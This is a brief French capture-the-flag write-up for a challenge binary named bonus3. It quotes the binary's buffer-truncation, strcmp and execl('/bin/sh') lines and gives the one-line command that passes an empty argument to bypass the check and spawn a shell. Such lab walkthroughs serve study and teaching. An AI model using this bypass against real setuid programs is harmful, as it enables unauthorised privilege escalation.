# bonus3 - ??????????? WTF

On a 
- `buffer[atoi(argv[1])] = '\0';`
  
Et

- `if (strcmp(buffer, argv[1]) == 0)`

Si on envoie une chaine vide la comparaison est true et 
- `execl("/bin/sh", "/bin/sh", NULL)`
est execute.


./bonus3 ""
